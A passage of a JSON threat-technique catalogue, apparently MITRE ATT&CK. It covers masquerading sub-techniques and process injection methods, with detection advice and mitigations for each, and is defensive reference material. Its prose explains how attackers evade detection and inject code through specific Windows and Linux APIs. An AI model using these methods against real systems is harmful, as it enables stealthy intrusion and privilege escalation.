and/or block execution of files where headers and extensions do not match."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Implement security controls on the endpoint, such as a Host Intrusion Prevention System (HIPS), to identify and prevent execution of files with mismatching file signatures."},{"id":"M1049","name":"Antivirus/Antimalware","description":"Anti-virus can be used to automatically quarantine suspicious files."}]},{"id":"T1036.009","name":"Break Process Trees","description":"An adversary may attempt to evade process tree-based analysis by modifying executed malware's parent process ID (PPID). If endpoint protection software leverages the “parent-child\" relationship for detection, breaking this relationship could result in the adversary’s behavior not being associated with previous process tree activity. On Unix-based systems breaking this process tree is common practice for administrators to execute software using scripts and programs. <a href=\"https://0xjet.github.io/3OHA/2022/04/11/post.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 3OHA double-fork 2022)</a> \n\nOn Linux systems, adversaries may execute a series of Native API calls to alter malware's process tree. For example, adversaries can execute their payload without any arguments, call the <code>fork()</code> API call twice, then have the parent process exit. This creates a grandchild process with no parent process that is immediately adopted by the <code>init</code> system process (PID 1), which successfully disconnects the execution of the adversary's payload from its previous process tree.\n\nAnother example is using the “daemon” syscall to detach from the current parent process and run in the background. <a href=\"https://sandflysecurity.com/blog/bpfdoor-an-evasive-linux-backdoor-technical-analysis/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sandfly BPFDoor 2022)</a> <a href=\"https://www.microsoft.com/en-us/security/blog/2022/05/19/rise-in-xorddos-a-deeper-look-at-the-stealthy-ddos-malware-targeting-linux-devices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft XorDdos Linux Stealth 2022)</a>","detection":"","platforms":["Linux","macOS"],"dataSources":["Process: OS API Execution","Process: Process Creation"],"mitigations":[]},{"id":"T1036.010","name":"Masquerade Account Name","description":"Adversaries may match or approximate the names of legitimate accounts to make newly created ones appear benign. This will typically occur during Create Account, although accounts may also be renamed at a later date. This may also coincide with Account Access Removal if the actor first deletes an account before re-creating one with the same name. <a href=\"https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Huntress MOVEit 2023)</a>\n\nOften, adversaries will attempt to masquerade as service accounts, such as those associated with legitimate software, data backups, or container cluster management. <a href=\"https://www.elastic.co/security-labs/cuba-ransomware-campaign-analysis\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic CUBA Ransomware 2022)</a> <a href=\"https://blog.aquasec.com/leveraging-kubernetes-rbac-to-backdoor-clusters\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Aquasec Kubernetes Attack 2023)</a> They may also give accounts generic, trustworthy names, such as “admin”, “help”, or “root.” <a href=\"https://www.invictus-ir.com/news/ransomware-in-the-cloud\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Invictus IR Cloud Ransomware 2024)</a> Sometimes adversaries may model account names off of those already existing in the system, as a follow-on behavior to Account Discovery.  \n\nNote that this is distinct from Impersonation, which describes impersonating specific trusted individuals or organizations, rather than user or service account names.","detection":"","platforms":["Containers","IaaS","Identity Provider","Linux","macOS","Office Suite","SaaS","Windows"],"dataSources":["User Account: User Account Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Consider defining and enforcing a naming convention for user accounts to more easily spot generic account names that do not fit the typical schema."},{"id":"M1047","name":"Audit","description":"Audit user accounts to ensure that each one has a defined purpose."}]},{"id":"T1036.011","name":"Overwrite Process Arguments","description":"Adversaries may modify a process's in-memory arguments to change its name in order to appear as a legitimate or benign process. On Linux, the operating system stores command-line arguments in the process’s stack and passes them to the <code>main()</code> function as the <code>argv</code> array. The first element, <code>argv[0]</code>, typically contains the process name or path - by default, the command used to actually start the process (e.g., <code>cat /etc/passwd</code>). By default, the Linux <code>/proc</code> filesystem uses this value to represent the process name. The <code>/proc/&lt;PID&gt;/cmdline</code> file reflects the contents of this memory, and tools like <code>ps</code> use it to display process information. Since arguments are stored in user-space memory at launch, this modification can be performed without elevated privileges. \n\nDuring runtime, adversaries can erase the memory used by all command-line arguments for a process, overwriting each argument string with null bytes. This removes evidence of how the process was originally launched. They can then write a spoofed string into the memory region previously occupied by <code>argv[0]</code> to mimic a benign command, such as <code>cat resolv.conf</code>. The new command-line string is reflected in <code>/proc/&lt;PID&gt;/cmdline</code> and displayed by tools like <code>ps</code>. <a href=\"https://sandflysecurity.com/blog/bpfdoor-an-evasive-linux-backdoor-technical-analysis/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sandfly BPFDoor 2022)</a> <a href=\"https://www.microsoft.com/en-us/security/blog/2022/05/19/rise-in-xorddos-a-deeper-look-at-the-stealthy-ddos-malware-targeting-linux-devices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft XorDdos Linux Stealth 2022)</a>","detection":"","platforms":["Linux"],"dataSources":[],"mitigations":[]},{"id":"T1036.012","name":"Browser Fingerprint","description":"Adversaries may attempt to blend in with legitimate traffic by spoofing browser and system attributes like operating system, system language, platform, user-agent string, resolution, time zone, etc.  The HTTP User-Agent request header is a string that lets servers and network peers identify the application, operating system, vendor, and/or version of the requesting user agent. <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/User-Agent\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mozilla User Agent)</a>\n\nAdversaries may gather this information through System Information Discovery or by users navigating to adversary-controlled websites, and then use that information to craft their web traffic to evade defenses. <a href=\"https://arxiv.org/pdf/2110.10129\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Gummy Browsers Targeted Browser Spoofing against State-of-the-Art Fingerprinting Techniques)</a>","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":[],"mitigations":[{"id":"M1047","name":"Audit","description":"Review and limit the fingerprinting surface to only necessary information on each browser to make the browser less unique. For example, the available fonts may be limited to a standard font list. <a href=\"https://www.w3.org/TR/fingerprinting-guidance/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: W3C)</a>"}]}]},{"id":"T1055","name":"Process Injection","description":"Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a> \n\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \n\nMonitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods. <em>The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory</em> (Ligh et al., Wiley, 2014) <a href=\"https://www.gnu.org/software/acct/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GNU Acct)</a> <a href=\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RHEL auditd)</a> <a href=\"http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Chokepoint preload rootkits)</a> \n\nMonitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules. <a href=\"https://docs.microsoft.com/sysinternals/downloads/sysmon\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Sysmon v6 May 2017)</a> \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Access","Process: Process Modification","File: File Modification","Process: Process Metadata","File: File Metadata","Process: OS API Execution","Module: Module Load"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only. Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process. For example, on Windows 10, Attack Surface Reduction (ASR) rules may prevent Office applications from code injection. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"}],"subTechniques":[{"id":"T1055.001","name":"Dynamic-link Library Injection","description":"Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a> \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>). <a href=\"https://www.endgame.com/blog/technical-blog/hunting-memory\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic HuntingNMemory June 2017)</a> <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a> \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process. <a href=\"https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Module Stomping for Shellcode Injection)</a> This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk. <a href=\"https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hiding Malicious Code with Module Stomping)</a> \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code> and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Windows"],"dataSources":["Process: Process Metadata","Process: Process Access","Process: Process Modification","Module: Module Load","Process: OS API Execution"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.002","name":"Portable Executable Injection","description":"Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a> \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code> and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Windows"],"dataSources":["Process: Process Access","Process: OS API Execution","Process: Process Modification"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.003","name":"Thread Execution Hijacking","description":"Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nThis is very similar to Process Hollowing but targets an existing process rather than creating a process in a suspended state.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Windows"],"dataSources":["Process: OS API Execution","Process: Process Modification","Process: Process Access"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.004","name":"Asynchronous Procedure Call","description":"Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. \n\nAPC injection is commonly performed by attaching malicious code to the APC Queue <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms681951.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft APC)</a> of a process's thread. Queued APC functions are executed when the thread enters an alterable state. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms681951.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft APC)</a> A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing to a malicious DLL). \n\nA variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. <a href=\"https://www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CyberBit Early Bird Apr 2018)</a> AtomBombing <a href=\"https://blog.ensilo.com/atombombing-brand-new-code-injection-for-windows\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ENSIL AtomBombing Oct 2016)</a> is another variation that utilizes APCs to invoke malicious code previously written to the global atom table. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms649053.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Atom Table)</a>\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Windows"],"dataSources":["Process: OS API Execution","Process: Process Access","Process: Process Modification"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.005","name":"Thread Local Storage","description":"Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. \n\nTLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other Process Injection techniques such as Process Hollowing. <a href=\"https://www.fireeye.com/blog/threat-research/2017/11/ursnif-variant-malicious-tls-callback-technique.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye TLS Nov 2017)</a>\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Windows"],"dataSources":["Process: Process Modification","Process: Process Access","Process: OS API Execution"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.008","name":"Ptrace System Calls","description":"Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPtrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values. <a href=\"http://man7.org/linux/man-pages/man2/ptrace.2.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PTRACE man)</a> Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>) then invoking that memory with <code>PTRACE_SETREGS</code> to set the register containing the next instruction to execute. Ptrace system call injection can also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>, which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction). <a href=\"http://man7.org/linux/man-pages/man2/ptrace.2.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PTRACE man)</a> <a href=\"https://medium.com/@jain.sm/code-injection-in-running-process-using-ptrace-d3ea7191a4be\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Medium Ptrace JUL 2018)</a> \n\nPtrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges. <a href=\"https://github.com/gaffe23/linux-inject/blob/master/slides_BHArsenal2015.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BH Linux Inject)</a> \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.","detection":"Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods. <em>The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory</em> (Ligh et al., Wiley, 2014) <a href=\"https://www.gnu.org/software/acct/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GNU Acct)</a> <a href=\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RHEL auditd)</a> <a href=\"http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Chokepoint preload rootkits)</a> \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Linux"],"dataSources":["Process: OS API Execution","Process: Process Access","Process: Process Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only. Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.009","name":"Proc Memory","description":"Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. \n\nProc memory injection involves enumerating the memory of a process via the /proc filesystem (<code>/proc/[pid]</code>) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes’ memory map within <code>/proc/[pid]/maps</code> can be overwritten using dd. <a href=\"http://hick.org/code/skape/papers/needle.txt\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Uninformed Needle)</a> <a href=\"https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GDS Linux Injection)</a> <a href=\"http://man7.org/linux/man-pages/man1/dd.1.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DD Man)</a> \n\nOther techniques such as Dynamic Linker Hijacking may be used to populate a target process with more available gadgets. Similar to Process Hollowing, proc memory injection may target child processes (such as a backgrounded copy of sleep). <a href=\"https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GDS Linux Injection)</a> \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.","detection":"File system monitoring can determine if /proc files are being modified. Users should not have permission to modify these in most cases. \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Linux"],"dataSources":["File: File Modification"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict the permissions on sensitive files such as <code>/proc/[pid]/maps</code> or <code>/proc/[pid]/mem</code>."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.011","name":"Extra Window Memory Injection","description":"Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms633574.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Window Classes)</a> Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms633584.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft GetWindowLong function)</a> <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms633591.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SetWindowLong function)</a>\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a> More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process. <a href=\"https://www.malwaretech.com/2013/08/powerloader-injection-something-truly.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MalwareTech Power Loader Aug 2013)</a> <a href=\"https://www.welivesecurity.com/2013/03/19/gapz-and-redyms-droppers-based-on-power-loader-code/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WeLiveSecurity Gapz and Redyms Mar 2013)</a>\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.","detection":"Monitor for API calls related to enumerating and manipulating EWM such as GetWindowLong <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms633584.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft GetWindowLong function)</a> and SetWindowLong <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms633591.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SetWindowLong function)</a>. Malware associated with this technique have also used SendNotifyMessage <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms644953.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SendNotifyMessage function)</a> to trigger the associated window procedure and eventual malicious injection. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" 